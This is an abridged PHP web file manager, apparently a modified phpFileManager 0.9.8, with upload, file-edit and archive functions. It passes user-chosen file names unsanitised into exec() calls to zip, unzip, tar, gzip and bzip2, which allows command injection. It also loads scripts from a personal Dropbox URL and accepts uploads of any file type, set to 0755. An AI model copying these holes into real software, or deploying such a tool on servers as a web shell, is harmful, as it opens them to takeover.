<?php
//a:9:{s:4:"lang";s:2:"en";s:9:"auth_pass";s:32:"4cc55900d6698851b1b546e398a99f94";s:8:"quota_mb";i:0;s:17:"upload_ext_filter";a:0:{}s:19:"download_ext_filter";a:0:{}s:15:"error_reporting";s:1:"0";s:7:"fm_root";s:10:"/home/www/";s:17:"cookie_cache_time";i:2700;s:7:"version";s:5:"0.9.8";}
// +--------------------------------------------------
// | Header and Globals
// +--------------------------------------------------	
    $charset = "UTF-8";
    ...
    if ($opdir = @opendir($current_dir)) {
        ...
        function test_prompt(arg){
            ...
            if (arg == 1){
                ...
                else if(confirm('".et('Compress')." ?')) document.form_action.cmd_arg.value='".time().".zip';
            }
            if (erro!=''){
...
function upload_form(){
    global $_FILES,$current_dir,$dir_dest,$fechar,$quota_mb,$path_info,$upload_ext_filter;
    ...
    if (!isset($_GET['upload'])) {
        ...
        <link href="https://dl.dropboxusercontent.com/u/91159660/mini-upload-form/style.css" rel="stylesheet" />
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
        <script src="https://dl.dropboxusercontent.com/u/91159660/mini-upload-form/jquery.knob.js"></script>
        <script src="https://dl.dropboxusercontent.com/u/91159660/mini-upload-form/jquery.ui.widget.js"></script>
        <script src="https://dl.dropboxusercontent.com/u/91159660/mini-upload-form/jquery.iframe-transport.js"></script>
        <script src="https://dl.dropboxusercontent.com/u/91159660/mini-upload-form/jquery.fileupload.js"></script>
        <script src="https://dl.dropboxusercontent.com/u/91159660/mini-upload-form/script.js"></script>
        </head>
        <body>
        <center><font size="5" color="red" >.: '.$current_dir.' :.</font></center>
        <form id="upload" method="post" action="'.$path_info["basename"].'?action=10&upload=1&dir_dest='.$current_dir.'" enctype="multipart/form-data">
        <div id="drop">Drop Here<a>Browse</a><input type="file" name="upl" multiple /></div><ul></ul>
        </form>        
        </body>
        </html>';
    } else {
        if (isset($_FILES['upl']) && $_FILES['upl']['error'] == 0) {
            ...
            if (in_array(strtolower($extension), $upload_ext_filter)) {
                echo '{"status":"error"}';
                exit(0);
            }
            if ($quota_mb > 0) {
                if ($_FILES['file']['size'] > $quota_mb*1024*1024) {
                    echo '{"status":"error"}';
                    exit(0);
                }
            }
            if (move_uploaded_file($_FILES['upl']['tmp_name'], $dir_dest.$_FILES['upl']['name'])) {
                @chmod($dir_dest.$_FILES['upl']['name'],0755);
                echo '{"status":"success"}';
                exit(0);
            }
        }
...
function view(){
	...
	if (intval($passthru)){
	    ...
	    if ($is_reachable_thru_webserver){
	        ...
	        $url = $url_info["scheme"]."://".$_SERVER['HTTP_HOST'];
...
function edit_file_form(){
    ...
    if ($save_file){
		if (file_put_contents($file, $file_data) === false)
			echo "<script>alert('$filename could not be saved.');</script>";
    }

	$file_data=file_get_contents($file);
    html_header();
    echo "<body marginwidth=\"0\" marginheight=\"0\">
    <center><form name=\"edit_form\" action=\"".$path_info["basename"]."\" method=\"post\">
    <input type=hidden name=action value=\"7\">
    <input type=hidden name=save_file value=\"1\">
    <input type=hidden name=current_dir value=\"$current_dir\">
    <input type=hidden name=filename value=\"$filename\">
    ".$file."
    <input type=button value=\"".et('Refresh')."\" onclick=\"document.edit_form_refresh.submit()\">
    <input type=button value=\"".et('SaveFile')."\" onclick=\"go_save()\">
    <textarea id=file_data name=file_data style='width:750px;height:530px;'>".$file_data."</textarea>
    </form>
    ...
    <script src=\"https://dl.dropboxusercontent.com/u/91159660/mini-upload-form/jquery-linedtextarea.js\"></script>
    <link href=\"https://dl.dropboxusercontent.com/u/91159660/mini-upload-form/jquery-linedtextarea.css\" type=\"text/css\" rel=\"stylesheet\" />
    <script language=\"Javascript\" type=\"text/javascript\">
    <!--
...
function config_form(){
    global $cfg;
    global $current_dir,$fm_self,$doc_root,$path_info,$fm_current_root,$lang,$error_reporting,$version,$cookie_cache_time;
    ...
    switch ($config_action){
        ...
        case 3:
            if ($cfg->data['auth_pass'] != md5($newpass)){
                ...
                setcookie("loggedon", md5($newpass) , time()+$cookie_cache_time , "/");
            }
            $cfg->save();
...
function login(){
    global $pass,$auth_pass,$path_info,$cookie_cache_time;
    if (md5(trim($pass)) == $auth_pass){
        setcookie("loggedon",$auth_pass,time()+$cookie_cache_time,"/");
            ...
            if (strlen($cmd_arg)){
				...
				if (strlen($selected_file_list)){
                    ...
                    if (count($selected_file_list)) {
                        for($x=0;$x<count($selected_file_list);$x++) {
                            $selected_file_list[$x] = trim($selected_file_list[$x]);
                            if (strlen($selected_file_list[$x])) { $name_file=$selected_file_list[0]; $tmp=$tmp." ".$selected_file_list[$x]; }
                        }
                    }
                }
                if (strlen($selected_dir_list)){
                    ...
                    if (count($selected_dir_list)) {
                        for($x=0;$x<count($selected_dir_list);$x++) {
                            $selected_dir_list[$x] = trim($selected_dir_list[$x]);
                            if (strlen($selected_dir_list[$x])) { $name_dir=$selected_dir_list[0]; $tmp=$tmp." ".$selected_dir_list[$x]; }
                        }
                    }
                }
                $name=strlen($name_dir) ? $name_dir : $name_file;
                $name=$name.'_'.time().'.zip';
                $cmd_arg=$name;
                exec('zip -r '.$cmd_arg.$tmp);
            }
            break;
            case 72: // decompress arq
            if (strlen($cmd_arg)){
                if (file_exists($current_dir.$cmd_arg)){
                    if (strstr($cmd_arg,".zip")) exec('unzip '.$cmd_arg);
                    elseif (strstr($cmd_arg,".bzip")||strstr($cmd_arg,".bz2")||strstr($cmd_arg,".tbz2")||strstr($cmd_arg,".bz")||strstr($cmd_arg,".tbz")) exec('bzip2 -d '.$cmd_arg);
                    elseif (strstr($cmd_arg,".gzip")||strstr($cmd_arg,".gz")||strstr($cmd_arg,".tgz")) exec('gzip -d '.$cmd_arg);
                    elseif (strstr($cmd_arg,".tar")) exec('tar xvf '.$cmd_arg);
                    reloadframe("parent",2);
                }
            }
            break;
